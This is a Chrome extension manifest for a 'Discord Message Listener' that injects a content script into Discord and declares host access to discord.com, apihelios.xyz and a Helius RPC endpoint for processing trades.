{
  "manifest_version": 3,
  "name": "Discord Message Listener",
  "version": "1.0",
  "description": "Listens to Discord messages and processes trades.",
  "permissions": [
    "storage",
    "activeTab",
    "alarms"
  ],
  "host_permissions": [
    "https://discord.com/*",
    "https://apihelios.xyz/*",
    "https://mainnet.helius-rpc.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["https://discord.com/*"],
      "js": ["content.js"]
    }
  ],
  "action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icon.png",
      "48": "icon.png",
      "128": "icon.png"
    }
  }
}
